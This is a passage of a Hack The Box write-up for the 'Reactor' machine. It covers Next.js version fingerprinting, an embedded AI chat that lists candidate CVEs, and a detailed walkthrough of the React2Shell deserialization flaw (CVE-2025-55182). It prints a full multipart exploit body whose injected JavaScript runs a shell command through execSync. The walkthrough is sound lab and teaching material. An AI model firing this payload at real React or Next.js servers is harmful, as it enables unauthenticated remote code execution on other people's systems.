---
title: "HTB: Reactor | 0xdf hacks stuff"
source: https://0xdf.gitlab.io/2026/10/03/htb-reactor.html
source_host: 0xdf.gitlab.io
clip_date: 2026-10-04T18:16:35+08:00
trace_id: 22b7c9b8-818a-459a-8f4f-82aea35aed82
content_hash: 61c204ecb4a97c6a5cd862ce55002c67c570728c26ddd5cdea0f3799621b1345
status: synced
tags:
  - CTF
  - 漏洞分析
series: null
feed_source: 0xdf·HTB/逆向
ai_summary: TL;DR：HTB Reactor 利用 Next.js/React Server Components 的 React2Shell 预认证 RCE 拿 shell，再通过 SQLite 弱口令与 Node Inspector 提权至 root。
ai_summary_style: key-points
images_status:
  total: 15
  succeeded: 12
  failed_urls:
    - https://www.hackthebox.com/badge/image/288520
    - https://www.hackthebox.com/badge/image/2022228
    - https://www.hackthebox.com/badge/image/1034496
notion_page_id: 3ef75244-d011-81e3-8cbe-e103e248e086
ioc:
  cves:
    - CVE-2024-51479
    - CVE-2025-29927
    - CVE-2025-32421
    - CVE-2025-55173
    - CVE-2025-55182
    - CVE-2025-57822
    - CVE-2025-66478
  cwes: []
  hashes:
    - 39d97110eafe2a9a68639812cd271e8e
    - a203b22191d744a4e70ada5c101b17b8
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> TL;DR：HTB Reactor 利用 Next.js/React Server Components 的 React2Shell 预认证 RCE 拿 shell，再通过 SQLite 弱口令与 Node Inspector 提权至 root。
> 
> - **入口识别：** nmap 发现 22/3000 端口，3000 为 Next.js 应用；从客户端 JS 分块提取版本为 Next.js 15.0.3、React 19.0.0-rc，定位到 CVE-2025-55182/React2Shell。
> - **漏洞利用：** React Server Components 反序列化缺陷，向任意路径 POST 并带 `Next-Action` 头触发；multipart 伪造 Flight Chunk/Response，用 `[]:constructor:constructor` 取 `Function` 构造器，经 `_prefix` 执行命令，获得 node shell。
> - **横向到 engineer：** `/opt/reactor-app/reactor.db` 的 users 表有 admin/engineer 的 MD5 哈希，engineer 哈希破解为 `reactor1`，且复用于系统账户，`su`/SSH 登录并读取 user.txt。
> - **提权到 root：** root 运行 `/opt/uptime-monitor/worker.js`，带 `node --inspect=127.0.0.1:9229`；通过 SSH 隧道或本地连接 Chrome DevTools Protocol，执行 Runtime.evaluate/`exec` 在 root 进程内运行代码。
> - **多种利用路径：** 可用 Chromium `chrome://inspect` 或命令行 `node inspect 127.0.0.1:9229`；直接写入 root 的 authorized_keys 获得 SSH root shell，也可从 node 用户跳过 engineer 直接提权。

[HTB: Reactor](https://0xdf.gitlab.io/2026/10/03/htb-reactor.html)

![](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/reactor-cover.webp)

Reactor is a Linux box running a nuclear reactor monitoring dashboard built on NextJS. I’ll pull the framework and React versions out of the JavaScript chunks served to the browser, and find that the site is vulnerable to React2Shell, a pre-authentication flaw where React Server Components unsafely deserialize data from server function requests, giving remote code execution and a shell. In the application directory I’ll find a SQLite database with password hashes that crack to give the next user. To escalate, I’ll find a monitoring script running as root with the NodeJS inspector listening on localhost, and tunnel to it to run code inside that root process using the Chrome DevTools Protocol. I’ll also show to do the root step using node from the command line, and how it can be done directly from the foothold skipping user.

## Box Info

[![Reactor](https://0xdf.gitlab.io/icons/box-reactor.webp)](https://hackthebox.com/machines/reactor)

[Reactor](https://hackthebox.com/machines/reactor)

Easy

Retire Date 03 Oct 2026

![Linux](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/85d7b9cda22fbe98.png)

OS ![Linux](https://0xdf.gitlab.io/icons/Linux.webp)

Rated Difficulty ![Rated difficulty for Reactor](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/reactor-diff.webp)

![Rated difficulty for Reactor](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/fcb4d866d27e0371.png)

Radar Graph ![Radar chart for Reactor](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/reactor-radar.webp)

![Radar chart for Reactor](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/584e2320aee56a48.png)

User

00:03:31 [j88001](https://app.hackthebox.com/users/288520)

![⚠️ 图片托管失败 · j88001](https://www.hackthebox.com/badge/image/288520)

Root

00:07:58 [dm0n3y](https://app.hackthebox.com/users/2022228)

![⚠️ 图片托管失败 · dm0n3y](https://www.hackthebox.com/badge/image/2022228)

Creator [tejas3008](https://app.hackthebox.com/users/1034496)

![⚠️ 图片托管失败 · tejas3008](https://www.hackthebox.com/badge/image/1034496)

## Recon

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (3000):

```swift
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.129.91.79
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-23 01:20 UTC
Nmap scan report for 10.129.91.79
Host is up, received echo-reply ttl 63 (0.038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63

Nmap done: 1 IP address (1 host up) scanned in 8.92 seconds
oxdf@hacky$ sudo nmap -p 22,3000 -sCV 10.129.91.79
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-23 01:21 UTC
Nmap scan report for 10.129.91.79
Host is up (0.020s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000,
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Wed, 23 Sep 2026 01:22:04 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Wed, 23 Sep 2026 01:22:04 GMT
|     Connection: close
|   Help, NCP, RPCCheck:
|     HTTP/1.1 400 Bad Request
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=9/23%Time=6AB329AF%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,44A8,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Route
SF:r-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,
SF:\x20Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x2
SF:01\r\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r
SF:\nCache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\
SF:"\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:017175\r\nDate:\x20Wed,\x2023\x20Sep\x202026\x2001:22:04\x20GMT\r\nConn
SF:ection:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><m
SF:eta\x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width
SF:=device-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20hre
SF:f=\"/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next
SF:\"/><link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\
SF:x20href=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\
SF:x20src=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=
SF:\"\"></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead
SF:1\.js\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOp
SF:tions,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-
SF:Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Pref
SF:etch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x
SF:20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20W
SF:ed,\x2023\x20Sep\x202026\x2001:22:04\x20GMT\r\nConnection:\x20close\r\n
SF:\r\n")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x
SF:20RSC,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Rout
SF:er-Segment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control
SF::\x20private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidat
SF:e\r\nDate:\x20Wed,\x2023\x20Sep\x202026\x2001:22:04\x20GMT\r\nConnectio
SF:n:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.44 seconds
```

Based on the [OpenSSH version](https://0xdf.gitlab.io/cheatsheets/os#ubuntu), the host is likely running Ubuntu 24.04 Noble (LTS).

Both of the ports show a TTL of 63, which matches the [expected TTL](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for Linux one hop away.

The HTTP headers show references to [NextJS](https://nextjs.org/), a JavaScript Web framework.

### Website - TCP 3000

#### Site

The site is a monitoring dashboard for a nuclear reactor:

![image-20260922213053179](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/2d4debcae58cc7f3.png)

![image-20260922213053179](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260922213053179.webp)

The page doesn’t have any links or interaction.

#### Tech Stack

Looking in Burp, the HTTP response headers show several that mention NextJS:

```yaml
HTTP/1.1 200 OK
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
x-nextjs-cache: HIT
x-nextjs-prerender: 1
x-nextjs-stale-time: 4294967294
X-Powered-By: Next.js
Cache-Control: s-maxage=31536000, 
ETag: "p02u6gnhufd8t"
Content-Type: text/html; charset=utf-8
Date: Wed, 23 Sep 2026 01:27:33 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 17175
```

I’ll try to guess at some index page paths like `/index.html` and `/index`, but none load the main page. This makes sense for a framework like NextJS which uses code to define paths rather than a filesystem.

The 404 page matches the default [NextJS 404](https://0xdf.gitlab.io/cheatsheets/404#nextjs):

![image-20260922213245061](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260922213245061.webp)

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```sql
oxdf@hacky$ feroxbuster -u http://10.129.91.79:3000
                                                                                                                                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.91.79:3000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l      120w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
308      GET        1l        1w       17c http://10.129.91.79:3000/_next/static/css/ => http://10.129.91.79:3000/_next/static/css
308      GET        1l        1w       13c http://10.129.91.79:3000/_next/static/ => http://10.129.91.79:3000/_next/static
200      GET        1l     2125w   112594c http://10.129.91.79:3000/_next/static/chunks/polyfills-42372ed130431b0a.js
308      GET        1l        1w        6c http://10.129.91.79:3000/_next/ => http://10.129.91.79:3000/_next
200      GET        1l        2w      463c http://10.129.91.79:3000/_next/static/chunks/main-app-4fbb4b1f318e39a0.js
200      GET        1l       85w     6707c http://10.129.91.79:3000/_next/static/css/414e1be982bc8557.css
200      GET        1l     2979w   166088c http://10.129.91.79:3000/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js
308      GET        1l        1w       20c http://10.129.91.79:3000/_next/static/chunks/ => http://10.129.91.79:3000/_next/static/chunks
200      GET        1l       66w     3329c http://10.129.91.79:3000/_next/static/chunks/webpack-db0a529a99835594.js
200      GET        2l     4694w   181180c http://10.129.91.79:3000/_next/static/chunks/517-d083b552e04dead1.js
200      GET        1l      337w    17175c http://10.129.91.79:3000/
[####################] - 3m     30010/30010   0s      found:11      errors:0      
[####################] - 3m     30000/30000   160/s   http://10.129.91.79:3000/
```

It identifies the JavaScript loaded by the framework, but nothing else really interesting.

#### NextJS

A NextJS application has a client-side routing structure that is compiled into a bunch of heavily minified and broken up JavaScript files on the server. There are two types of routers in a NextJS application. If there’s a `__NEXT_DATA__` object in the main HTML page, then it’s a pages router. I would use that to get the `buildId` and visit `/_next/static/<buildId>/_buildManifest.js`. But that’s not in this page, which means it’s an app router. This is harder to put together.

One quick check worth doing is looking for `.map` files:

```swift
oxdf@hacky$ for f in $(curl -s http://10.129.91.79:3000 | grep -oE '/_next/static/[^"\\]+\.js'); do
  ‍echo -n "$f.map -> "; curl -s -o /dev/null -w '%{http_code}\n' "http://10.129.91.79:3000$f.map"
‍done
/_next/static/chunks/webpack-db0a529a99835594.js.map -> 404
/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js.map -> 404
/_next/static/chunks/517-d083b552e04dead1.js.map -> 404
/_next/static/chunks/main-app-4fbb4b1f318e39a0.js.map -> 404
/_next/static/chunks/polyfills-42372ed130431b0a.js.map -> 404
/_next/static/chunks/webpack-db0a529a99835594.js.map -> 404
```

`webpack-*.js` shows up twice in that list because the page references it both as a `preload` link and as a `script` tag. Had I gotten any 200s, I could rebuild the original source.

I’ll download all five files the page references:

```bash
oxdf@hacky$ for f in $(curl -s http://10.129.91.79:3000 | grep -oE '/_next/static/[^"\\]+\.js' | sort -u); do wget "http://10.129.91.79:3000$f"; done
--2026-09-23 02:06:36--  http://10.129.91.79:3000/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js
Connecting to 10.129.91.79:3000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 166088 (162K) [application/javascript]
Saving to: ‘4bd1b696-80bcaf75e1b4285e.js’

4bd1b696-80bcaf75e1b4285e.js      100%[============================================================>] 162.20K  --.-KB/s    in 0.07s   

2026-09-23 02:06:37 (2.37 MB/s) - ‘4bd1b696-80bcaf75e1b4285e.js’ saved [166088/166088]

--2026-09-23 02:06:37--  http://10.129.91.79:3000/_next/static/chunks/517-d083b552e04dead1.js
Connecting to 10.129.91.79:3000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 181180 (177K) [application/javascript]
Saving to: ‘517-d083b552e04dead1.js’

517-d083b552e04dead1.js           100%[============================================================>] 176.93K  --.-KB/s    in 0.07s   

2026-09-23 02:06:37 (2.54 MB/s) - ‘517-d083b552e04dead1.js’ saved [181180/181180]

--2026-09-23 02:06:37--  http://10.129.91.79:3000/_next/static/chunks/main-app-4fbb4b1f318e39a0.js
Connecting to 10.129.91.79:3000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 463 [application/javascript]
Saving to: ‘main-app-4fbb4b1f318e39a0.js’

main-app-4fbb4b1f318e39a0.js      100%[============================================================>]     463  --.-KB/s    in 0s      

2026-09-23 02:06:37 (14.0 MB/s) - ‘main-app-4fbb4b1f318e39a0.js’ saved [463/463]

--2026-09-23 02:06:37--  http://10.129.91.79:3000/_next/static/chunks/polyfills-42372ed130431b0a.js
Connecting to 10.129.91.79:3000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 112594 (110K) [application/javascript]
Saving to: ‘polyfills-42372ed130431b0a.js’

polyfills-42372ed130431b0a.js     100%[============================================================>] 109.96K  --.-KB/s    in 0.06s   

2026-09-23 02:06:37 (1.68 MB/s) - ‘polyfills-42372ed130431b0a.js’ saved [112594/112594]

--2026-09-23 02:06:37--  http://10.129.91.79:3000/_next/static/chunks/webpack-db0a529a99835594.js
Connecting to 10.129.91.79:3000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3329 (3.3K) [application/javascript]
Saving to: ‘webpack-db0a529a99835594.js’

webpack-db0a529a99835594.js       100%[============================================================>]   3.25K  --.-KB/s    in 0s      

2026-09-23 02:06:37 (100 MB/s) - ‘webpack-db0a529a99835594.js’ saved [3329/3329]
```

I’ll beautify each:

```
oxdf@hacky$ npx js-beautify -r *.js
beautified 4bd1b696-80bcaf75e1b4285e.js
beautified 517-d083b552e04dead1.js
beautified main-app-4fbb4b1f318e39a0.js
beautified polyfills-42372ed130431b0a.js
beautified webpack-db0a529a99835594.js
```

`webpack-*.js` is the chunk map, which is the route list. Typically I’d look for something like:

```javascript
r.u = e => "static/chunks/" + ({143:"app/admin/page", 872:"app/login/page"}[e] || e) + "." + {143:"a1b2c3"}[e] + ".js"
```

These are the lazily-loaded routes. The `r` variable will change every time webpack runs, but the `.u` should be the same. I can also look for `.miniCssF`, which does the same thing for CSS:

```javascript
oxdf@hacky$ grep -n 'miniCssF' webpack-*.js
56:    }, r.f = {}, r.e = e => Promise.all(Object.keys(r.f).reduce((t, o) => (r.f[o](e, t), t), [])), r.u = e => {}, r.miniCssF = e => {}, r.g = function() {
```

In this case, both are empty. That means there are no lazily-loaded routes at all, so there’s only the one page.

`main-app-*.js` is the entry point. It’s reasonably short:

```javascript
(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [358], {
        5817: (e, s, n) => {
            Promise.resolve().then(n.t.bind(n, 7033, 23)), Promise.resolve().then(n.t.bind(n, 4547, 23)), Promise.resolve().then(n.t.bind(n, 4835, 23)), Promise.resolve().then(n.t.bind(n, 5244, 23)), Promise.resolve().then(n.t.bind(n, 2665, 23)), Promise.resolve().then(n.t.bind(n, 3866, 23)), Promise.resolve().then(n.t.bind(n, 6213, 23))
        }
    },
    e => {
        var s = s => e(e.s = s);
        e.O(0, [441, 517], () => (s(7200), s(5817))), _N_E = e.O()
    }
]);
```

`e.O(0, [441, 517], () => (s(7200), s(5817))), _N_E = e.O()` says that this entry depends on chunks 441 and 517, and boots modules 7200 and 5817.

There isn’t enough site here to dig into much further. I will at least get versions for the different software. A simple regex `grep` will fetch some versions:

```css
oxdf@hacky$ grep -Eoi 'version\s?[:=]\s*"[^"]*"' *
4bd1b696-80bcaf75e1b4285e.js:version: "19.0.0-rc-66855b96-20241106"
4bd1b696-80bcaf75e1b4285e.js:Version: "19.0.0-rc-66855b96-20241106"
4bd1b696-80bcaf75e1b4285e.js:version = "19.0.0-rc-66855b96-20241106"
517-d083b552e04dead1.js:version: "15.0.3"
517-d083b552e04dead1.js:version = ""
517-d083b552e04dead1.js:version = "19.0.0-rc-66855b96-20241106"
517-d083b552e04dead1.js:version = "19.0.0-rc-66855b96-20241106"
polyfills-42372ed130431b0a.js:version: "3.38.1"
```

Claude is able to do a ton with just this output:

```sql
▐▛███▛█   Claude Code v2.1.280
▝▜██████▀  Opus 5 · Claude Max
  ▝▝ ▝▝    /home/oxdf/hackthebox/reactor

Get to finished work sooner with Opus 5.5. Switch anytime with /model. 1 more notice hidden

❯ Just looking at this console output, what can you tell me about these version strings in a NextJS application: $ grep -Eoi 'version\s?[:=]\s*"[^"]*"' * 4bd1b696-80bcaf75e1b4285e.js:version: "19.0.0-rc-66855b96-20241106" 4bd1b696-80bcaf75e1b4285e.js:Version: "19.0.0-rc-66855b96-20241106" 4bd1b696-80bcaf75e1b4285e.js:version = "19.0.0-rc-66855b96-20241106" 517-d083b552e04dead1.js:version: "15.0.3" 517-d083b552e04dead1.js:version = "" 517-d083b552e04dead1.js:version = "19.0.0-rc-66855b96-20241106" 517-d083b552e04dead1.js:version = "19.0.0-rc-66855b96-20241106" polyfills-42372ed130431b0a.js:version: "3.38.1"

● Plenty, actually — that's a full build fingerprint.

What each line tells you

517-d083b552e04dead1.js → version: "15.0.3" This is the Next.js framework chunk. Next.js stamps its own version into the client runtime, and it matches the next package the server was built with — so this is the server's Next version too, not just a client artifact. 15.0.3 was released mid-November 2024.

19.0.0-rc-66855b96-20241106 React 19 release candidate, built from commit 66855b96 on 2024-11-06. Next.js 15.x pins an exact React RC build rather than a semver range, and that particular RC is the one bundled with 15.0.x — so it corroborates the 15.0.3 reading rather than being independent evidence. Two chunks carry it because 4bd1b696-*.js is the react-dom bundle and 517-*.js re-exports the version from the Next runtime.

Practical implication: React 19 RC + this chunk layout means App Router, with React Server Components in play.

polyfills-42372ed130431b0a.js → 3.38.1 core-js 3.38.1 (August 2024). Next ships this chunk for legacy browsers; the date lines up with the rest, so nothing was hand-upgraded.

version = "" Almost certainly an unset build-time field — deploymentId or similar — left empty because it wasn't configured. Not interesting on its own, but it does mean no deployment ID is being appended to asset requests.

The inferences worth drawing

Build floor: the app cannot have been built before 2024-11-06, and realistically not before ~2024-11-13 when 15.0.3 shipped. Given today's date, if it's still serving 15.0.3, this build is roughly two years stale and nobody has patched the framework in that window.

Vulnerability exposure. The one I'd go after first:

- CVE-2025-29927 — middleware authorization bypass via the x-middleware-subrequest header. Fixed in 15.2.3, so 15.0.3 is squarely in range. If the app uses middleware.ts for authz (very common in App Router apps), you can likely walk straight past it by setting that header. Worth testing immediately.

Others to check, though I'd verify the exact affected ranges before relying on them — I'm working from memory on the boundaries:

- CVE-2024-51479 — authorization bypass for routes under the app root; the 15.x fix landed in 15.0.4, which would put 15.0.3 one patch short. - CVE-2025-32421 — pages-router cache leak / RSC race condition, fixed around 15.1.6. - CVE-2025-57822 — SSRF via middleware response handling, fixed around 15.4.7. - CVE-2025-55173 — content injection through the image optimizer, if next/image is used with remote patterns.

Build diffing. Since you know the exact Next and React builds, you can npm install next@15.0.3 locally, build a trivial app, and diff the framework chunks against these. Anything that doesn't match is application code, which narrows where to read. The chunk hashes are also stable per build, so they work as a fingerprint for spotting when the target redeploys.

Want me to pull the current advisory data and pin down the exact affected ranges for 15.0.3, or start probing the middleware bypass?

✻ Crunched for 44s · done 2:27 AM
```

It’s a bit insane that it did this without any tool calls or web calls. It found:

-   NextJS is version 15.0.3
-   React is version 19.0.0-rc-66855b96-20241106
-   3.38.1 is a Polyfills version
-   Build date is somewhere between Nov 13 2024 and today, likely closer to that starting date.
-   Several vulnerabilities. It calls out CVE-2025-29927, the famous `x-middleware-subrequest` header, which I exploited in [HTB: Previous](https://0xdf.gitlab.io/2026/01/10/htb-previous.html#auth-bypass), but doesn’t make sense here as there’s no auth to bypass. Claude doesn’t name React2Shell, which was very close to the training cutoff date for this model.

## Shell as node

### Vulnerability Identification

Searching for “next js 15.0.3 vulnerabilities” turns up a couple CVE references:

![image-20260923174101598](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a7240acdf6252eea.png)

![image-20260923174101598](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260923174101598.webp)

Looking at NIST, [CVE-2025-66478](https://nvd.nist.gov/vuln/detail/cve-2025-66478) is a rejected duplicate of [CVE-2025-55182](https://nvd.nist.gov/vuln/detail/cve-2025-55182). Vercel still uses 66478 to track the downstream impact on NextJS applications, with 55182 covering the flaw upstream in React itself. Either way, the [Security Advisory](https://nextjs.org/blog/CVE-2025-66478) and the GitHub POC are referring to the same underlying vulnerability.

### React2Shell Background

[CVE-2025-55182](https://nvd.nist.gov/vuln/detail/cve-2025-55182), also known as React2Shell, is described by NIST as:

> A pre-authentication remote code execution vulnerability exists in React Server Components versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0 including the following packages: react-server-dom-parcel, react-server-dom-turbopack, and react-server-dom-webpack. The vulnerable code unsafely deserializes payloads from HTTP requests to Server Function endpoints.

This is a pre-authentication RCE vulnerability with a CVSS score of 10.0. It was added to [CISA KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-55182) on 5 December 2025.

The idea is to forge two internal React objects to confuse the Flight reply decoder. Flight is React’s name for the wire format that Server Components use, and the reply decoder is the half that parses data coming from the browser. The original discoverer has their [POCs on GitHub](https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc). The cleanest is:

```javascript
0="$1"
&1={
    "status":"resolved_model",
    "reason":0,
    "_response":"$5",
    "value":"{\"then\":\"$4:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}",
    "then":"$2:then"
}
&2="$@3"
&3=""
&4=[]
&5={
    "_prefix":"console.log('meowmeow')//",
    "_formData":{
        "get":"$4:constructor:constructor"
    },
    "_chunks":"$2:_response:_chunks",
    "_bundlerConfig":{}
}
```

This POC is the body for a `POST` to any path with a `Next-Action` header. The header value doesn’t matter, as the decoder runs before React validates the action ID. That means that even the simplest site running a vulnerable version of React can be targeted.

The POC’s proof of success is running the JavaScript `console.log('meowmeow')`, though I will weaponize this with something more interesting when I run it.

In `react-server-dom-webpack`, the decoder passes around a Response object that holds the state for the whole request:

```javascript
{ _bundlerConfig, _prefix, _formData, _chunks }
```

And each field in the incoming payload becomes a Chunk:

```javascript
{ status, value, reason, _response }
```

Field 1 of the POC is a forged Chunk, and field 5 is a forged Response. The rest is plumbing to get the two to meet:

| Field | Value | Role |
| --- | --- | --- |
| `0` | `"$1"` | Root model, pointing at chunk 1 |
| `1` | `{"status":"resolved_model",...}` | Forged Chunk, with `_response` pointed at the forged Response |
| `2` | `"$@3"` | Promise reference to chunk 3, used only to reach a genuine Response object |
| `3` | `""` | Filler, so that chunk 3 is genuine and has a genuine `_response` |
| `4` | `[]` | The springboard to `Function` |
| `5` | `{"_prefix":...}` | Forged Response |

A `$` in a value is a reference to another field, and `:` points to its properties. So `"$4:constructor:constructor"` means “take field 4, which is `[]`, get `[].constructor` (which is `Array`), then `Array.constructor` ”, which is the `Function` constructor. That’s the core exploit. The rest of the payload just arranges for it to get used.

Three things happen:

1.  Hijack the decoder’s Response: `"status":"resolved_model"` tells React that chunk 1 holds an unparsed JSON string, so it parses `value`, using `_response` to resolve any `$` references it finds inside. Since `_response` is `$5`, those now resolve against my object instead of React’s.
    
2.  Build the function: To look up a field, React calls `_formData.get(_prefix + id)`. On my forged Response, `_formData.get` is the `Function` constructor and `_prefix` is my JavaScript, so that lookup compiles a function instead of returning data:
    
    ```javascript
    Function("console.log('meowmeow')//" + id)
    ```
    
    React appends the field ID onto the end, which is what the trailing `//` comments out. `$B3` is what triggers the lookup. It’s a hex reference to field 179, which was never sent, so it misses React’s cache and falls through to my poisoned `get`. There’s nothing special about `$B3`. Any ID that wasn’t sent works.
    
3.  Call the function: `{"then":"$4:map","0":{"then":"$B3"},"length":1}` is both array-like and a thenable, and its `then` is `Array.prototype.map`. When React awaits it, `map` hands index `0` to the promise’s resolve function. Index `0` is itself a thenable whose `then` is the function from step 2, so unwrapping it calls my code.
    

Only `_prefix` needs to change to turn this into something more useful than a `console.log`.

### Exploit POC

The server function endpoint reads the request body as form data, so the numbered fields of the POC go across as form fields. I’ll write it as a multipart body, which keeps my payload out of URL encoding entirely, and save it as `r2s-body.txt`:

```powershell
------R2S
Content-Disposition: form-data; name="0"

"$1"
------R2S
Content-Disposition: form-data; name="1"

{"status": "resolved_model", "reason": 0, "_response": "$5", "value": "{\"then\": \"$4:map\", \"0\": {\"then\": \"$B3\"}, \"length\": 1}", "then": "$2:then"}
------R2S
Content-Disposition: form-data; name="2"

"$@3"
------R2S
Content-Disposition: form-data; name="3"

""
------R2S
Content-Disposition: form-data; name="4"

[]
------R2S
Content-Disposition: form-data; name="5"

{"_prefix": "process.mainModule.require('child_process').execSync('ping -c 1 10.10.15.169')//", "_formData": {"get": "$4:constructor:constructor"}, "_chunks": "$2:_response:_chunks", "_bundlerConfig": {}}
------R2S--
```

I’ve replaced the `console.log` with JavaScript to load the `child_process` module and call `ping` at my host. It has to reach the module loader the long way around. `_prefix` is compiled by the `Function` constructor, which builds the function in the global scope, where there’s no CommonJS `require` in scope to call. `process` is a true global, and `process.mainModule` is the module object for the entry script, so `process.mainModule.require` gets to the loader from there.

